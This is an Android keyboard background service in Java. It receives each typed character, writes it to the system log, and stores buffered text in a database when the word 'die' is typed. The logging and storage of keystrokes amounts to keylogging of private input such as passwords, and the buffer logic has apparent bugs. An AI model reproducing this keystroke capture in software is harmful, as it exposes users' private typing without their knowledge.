package com.ritwick.keyboard;

import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.os.IBinder;
import android.util.Log;

public class BackService extends Service {

    private StringBuffer sb = new StringBuffer();
    dbmaker db;
    int c=1;
    @Override
    public void onCreate() {
        super.onCreate();

        Log.e("BACKGROUND","SERVICE CREATED");
        db = new dbmaker(this);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        if(intent!=null) {
            String character = intent.getStringExtra("Character");

            Log.e("BACKGROUND"," "+ character);



            writeToSDFile(character);

        }
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void writeToSDFile(String data){
        char a = data.charAt(0);
        int asc = (int)a;
        //Log.e("Ascii value",Integer.toString(asc));
        if(asc==65531&&sb.length()>1){
            sb.delete(sb.length()-2,sb.length()-1);
        }
        else if(asc!=65531){
            if(sb.length()==20&&c>0) {
                store();
            }
            else{
                sb.append(data);
            }
        }
        Cursor c = db.getData();
        if(c.getCount()==0) {
            Log.e("DATABASE","EMPTY");
            return;
        }

        int counter = 0;
        while(c.moveToNext()){
            Log.e("VALUES",c.getString(0));
            if (++counter == 1)
                break;
        }
    }

    public void store(){
        String[] words = sb.toString().split("\\s");
        for(String w : words){
            //Log.e("WORDS",w);
            if(w.equals("die")){
                boolean done = db.insertData(sb.toString());
                c= 5;
                if (done)
                    Log.e("VALUES DB", "INSERTED");
                else
                    Log.e("VALUES DB", "FAILED");
                break;
            }
            else{
                if(c>1){
                    db.insertData(sb.toString());
                    c--;
                }
                else
                    c=1;
            }

        }
        sb = new StringBuffer();
    }

}
